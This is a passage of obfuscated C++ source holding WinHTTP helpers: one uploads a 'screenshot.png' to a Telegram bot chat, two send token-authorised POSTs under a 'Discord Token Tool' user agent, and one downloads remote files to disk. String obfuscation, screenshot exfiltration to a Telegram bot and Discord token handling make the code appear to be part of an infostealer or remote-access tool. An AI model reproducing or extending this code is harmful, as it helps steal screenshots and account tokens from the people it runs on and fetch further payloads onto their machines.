        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return (statusCode == 200);
    }

    bool send_telegram_photo( const std::vector<BYTE>& image_data) {
        if (image_data.empty()) return false;
        std::wstring token = telegram_token;
        std::wstring chat_id = telegram_chat_id;

        // Build multipart form data
        std::string boundary = oxorany("----WebKitFormBoundary7MA4YWxkTrZu0gW");
        std::string content =
            oxorany("--") + boundary + oxorany("\r\n" ) +
            oxorany("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n") +
            std::string(chat_id.begin(), chat_id.end()) + oxorany("\r\n") +
            oxorany("--" ) + boundary + oxorany("\r\n") +
            oxorany("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n" ) +
            oxorany("Content-Type: image/png\r\n\r\n" );

        std::vector<char> postData(content.begin(), content.end());
        postData.insert(postData.end(), image_data.begin(), image_data.end());

        std::string footer = oxorany("\r\n--") + boundary + oxorany("--\r\n");
        postData.insert(postData.end(), footer.begin(), footer.end());

        // WinHTTP session
        HINTERNET hSession = WinHttpOpen(oxorany(L"Telegram Bot/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, oxorany(L"api.telegram.org" ), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        std::wstring path = oxorany(L"/bot" ) + token + oxorany(L"/sendPhoto" );
        HINTERNET hRequest = WinHttpOpenRequest(hConnect,oxorany( L"POST" ), path.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        std::wstring headers = oxorany( L"Content-Type: multipart/form-data; boundary=" ) +
            std::wstring(boundary.begin(), boundary.end()) + L"\r\n";
        if (!WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
            (LPVOID)postData.data(), (DWORD)postData.size(),
            (DWORD)postData.size(), 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD statusCode = 0;
        DWORD dwSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &dwSize, NULL);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return (statusCode == 200);
    }

    std::string post(const std::string& url, const std::string& token, const std::string& body) {
        std::wstring wurl = std::wstring(url.begin(), url.end());
        URL_COMPONENTS urlComp = { 0 };
        urlComp.dwStructSize = sizeof(urlComp);
        wchar_t hostName[256] = { 0 };
        wchar_t urlPath[1024] = { 0 };
        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = 256;
        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = 1024;
        if (!WinHttpCrackUrl(wurl.c_str(), 0, 0, &urlComp)) return "";

        std::string agent_utf8 = oxorany("Discord Token Tool/1.0");
        std::wstring agent_wide(agent_utf8.begin(), agent_utf8.end());

        HINTERNET hSession = WinHttpOpen(agent_wide.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!hSession) return "";
        HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

        DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, NULL, NULL, NULL, flags);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

        std::string auth_header_utf8 = oxorany("Authorization: ") + token;
        std::string content_type_utf8 = oxorany("Content-Type: application/json");
        std::wstring headers = std::wstring(auth_header_utf8.begin(), auth_header_utf8.end()) + L"\r\n" +
            std::wstring(content_type_utf8.begin(), content_type_utf8.end()) + L"\r\n";

        WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), NULL, 0, body.size(), 0);

        if (!body.empty()) {
            WinHttpWriteData(hRequest, body.c_str(), body.size(), NULL);
        }
        WinHttpReceiveResponse(hRequest, NULL);

        std::string response;
        DWORD bytesRead = 0;
        char buffer[4096];
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            response.append(buffer, bytesRead);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return response;
    }

        HttpResponse post_multipart(const std::string& url, const std::string& token,
            const std::string& body, const std::string& boundary) {
            HttpResponse result;

            // Parse URL (simple, but effective)
            bool is_https = (url.find("https://") == 0);
            INTERNET_PORT port = is_https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;

            std::string host, path;
            size_t scheme_end = url.find("://");
            if (scheme_end == std::string::npos) return result;
            size_t host_start = scheme_end + 3;
            size_t path_start = url.find('/', host_start);
            if (path_start == std::string::npos) {
                host = url.substr(host_start);
                path = "/";
            } else {
                host = url.substr(host_start, path_start - host_start);
                path = url.substr(path_start);
            }

            std::wstring whost(host.begin(), host.end());
            std::wstring wpath(path.begin(), path.end());

            HINTERNET hSession = WinHttpOpen(L"Discord Token Tool/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                NULL, NULL, 0);
            if (!hSession) return result;

            HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), port, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                return result;
            }

            DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
                NULL, NULL, NULL, flags);
            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return result;
            }

            // Build headers
            std::string authHeader = "Authorization: " + token;
            std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
            std::wstring headers = std::wstring(authHeader.begin(), authHeader.end()) + L"\r\n" +
                std::wstring(contentType.begin(), contentType.end()) + L"\r\n";

            if (!WinHttpSendRequest(hRequest, headers.c_str(), headers.length(),
                NULL, 0, body.size(), 0)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return result;
            }

            if (!body.empty()) {
                DWORD bytesWritten = 0;
                WinHttpWriteData(hRequest, body.c_str(), (DWORD)body.size(), &bytesWritten);
            }

            if (!WinHttpReceiveResponse(hRequest, NULL)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return result;
            }

            // Get status code
            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                NULL, &statusCode, &statusCodeSize, NULL);
            result.status_code = statusCode;

            // Read response
            DWORD bytesRead = 0;
            char buffer[4096];
            std::string responseBody;
            while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                responseBody.append(buffer, bytesRead);
            }
            result.body = responseBody;

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return result;
        }

    bool download_file(const std::string& url, const std::string& dest) {
        // 1. Parse the URL
        URL_COMPONENTS urlComp = {0};
        urlComp.dwStructSize = sizeof(urlComp);
        wchar_t hostName[256] = {0};
        wchar_t urlPath[1024] = {0};
        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = 256;
        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = 1024;

        std::wstring wurl(url.begin(), url.end());
        if (!WinHttpCrackUrl(wurl.c_str(), 0, 0, &urlComp)) {
            return false;
        }

        // 2. Initialize WinHTTP
        HINTERNET hSession = WinHttpOpen(L"YourAppName/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            NULL, NULL, 0);
        if (!hSession) return false;

        // 3. Connect to the server
        HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        // 4. Create and send a request
        DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL, NULL, NULL, flags);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // 5. Receive the response
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // 6. Read and save the data
        std::ofstream outFile(dest, std::ios::binary);
        if (!outFile.is_open()) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD bytesRead = 0;
        char buffer[4096];
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            outFile.write(buffer, bytesRead);
        }

        outFile.close();

        // 7. Clean up
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return true;
    }
}